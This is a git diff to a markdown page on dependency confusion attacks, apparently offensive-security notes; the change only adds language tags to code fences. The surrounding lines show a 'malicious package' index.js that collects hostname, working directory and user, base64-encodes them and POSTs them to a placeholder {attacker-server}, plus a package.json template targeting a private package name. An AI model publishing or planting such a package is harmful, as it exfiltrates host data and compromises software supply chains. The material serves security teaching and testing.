@@ -17,7 +17,7 @@ pagetitle: Dependency Confusion
 - In Node, npm packages are stated in the package.json file
 - Will look something like this:
 
-```
+```json
 "devDependencies" : {
     "my_test_framework": "^3.1.0",
     "another_dev_dependency": "1.0.0 - 1.2.0"
@@ -39,7 +39,7 @@ pagetitle: Dependency Confusion
 - Node will then use the public package over the private one, allowing code execution
 - [Synyc](https://github.com/snyk-labs/snync) is a good tool to scan for and recognize these packages:
 
-```
+```sh
 # !/bin/bash
 # Set the base directory to the current working directory
 BASE_DIR =$( pwd )
@@ -60,7 +60,7 @@ done
 **Creating a Malicious package**
 - Create `index.js`:
 
-```
+```js
 const { exec } = require("child_process");
 exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attacker-server} -d $b" , (error, data, getter) => {
     if (error){
@@ -76,7 +76,7 @@ exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attack
 ```
 - Create `package.json`:
 
-```
+```json
 {
     "name":"{vulnerable_package_name}",
     "version":"{relevant_version_or_higher_if_^}",
